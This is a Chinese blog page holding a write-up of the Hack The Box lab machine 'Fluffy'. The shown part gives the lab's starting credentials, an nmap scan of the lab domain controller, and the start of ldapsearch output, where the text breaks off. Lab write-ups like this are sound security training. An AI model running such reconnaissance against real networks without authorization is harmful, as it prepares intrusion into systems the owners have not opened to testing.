<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="EnchanterW">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2025/05/28/fluffy/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="So many things to hack , such little time to work.">
<meta property="og:type" content="article">
<meta property="og:title" content="Fluffy">
<meta property="og:url" content="http://example.com/2025/05/28/Fluffy/index.html">
<meta property="og:site_name" content="Enchanterの小本本">
<meta property="og:description" content="So many things to hack , such little time to work.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/redefine-og.webp">
<meta property="article:published_time" content="2025-05-28T07:28:31.000Z">
<meta property="article:modified_time" content="2025-12-04T09:06:54.562Z">
<meta property="article:author" content="EnchanterW">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="Windows提权">
<meta property="article:tag" content="nxc">
<meta property="article:tag" content="certipy">
<meta property="article:tag" content="权限总结">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-DQKJ6ECS1S"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-DQKJ6ECS1S');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#3C9566">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            Fluffy | Enchanterの小本本
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    
        
<script src="/js/build/libs/anime.min.js"></script>

    

    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"zh-cn"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#3C9566","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"So many things to hack , such little time to work."},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"So many things to hack , such little time to work."},"google_analytics":{"enable":true,"id":"G-DQKJ6ECS1S"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Wellcome to my blog","subtitle":{"text":["So many things to hack , such little time to work."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#ffffff","dark":"#053154"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/Enchanter-W","Blog":"https://enchanter-w.github.io/","Friends":"/friends"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/12/30 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
        
<link rel="stylesheet" href="/fontawesome/sharp-solid.min.css">

    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    <h2 class="ml13">
        So many things to hack , such little time to work.
    </h2>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }
    </script>
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/web-app-manifest-192x192.png" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Enchanterの小本本
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    ABOUT
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Enchanter-W">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener external nofollow noreferrer" href="https://enchanter-w.github.io/">
                                                    BLOG
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/friends">
                                                    FRIENDS
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                ABOUT
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/Enchanter-W">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://enchanter-w.github.io/">BLOG</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/friends">FRIENDS</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/tags/"
                        >
                            <span>Tags</span>
                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories/"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			
			
			<img src="/images/Fluffy.png" alt="Fluffy" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
			
			<div class="w-full flex items-center absolute bottom-0 justify-start">
				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Fluffy</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/web-app-manifest-192x192.png">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">EnchanterW</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-05-28 15:28:31</span>
        <span class="mobile">2025-05-28 15:28:31</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-12-04 17:06:54</span>
            <span class="mobile">2025-12-04 17:06:54</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Writeup/">Writeup</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Windows%E6%8F%90%E6%9D%83/">Windows提权</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/nxc/">nxc</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/certipy/">certipy</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/">权限总结</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p>靶机提供初始凭证<code> j.fleischman / J0elTHEM4n1990!</code></p>
<h2 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Sun May 25 01:23:01 2025 as: nmap -sT -O -A -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49681,49695,49701,49738 -oA ./nmapscan/details 10.10.11.69</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.69</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-05-25 12:02:16Z)</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner <span class="keyword">time</span>.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-25T12:04:03+00:00; +6h38m57s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49681/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49695/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49701/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49738/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 6h38m56s, deviation: 0s, median: 6h38m56s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-05-25T12:03:27</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using proto 1/icmp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   110.54 ms 10.10.16.1</span><br><span class="line">2   202.93 ms 10.10.11.69</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun May 25 01:25:07 2025 -- 1 IP address (1 host up) scanned in 126.19 seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -H ldap://10.10.11.69 -s base -x</span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=fluffy,DC=htb</span><br><span class="line">ldapServiceName: fluffy.htb:dc01<span class="variable">$@FLUFFY</span>.HTB</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span 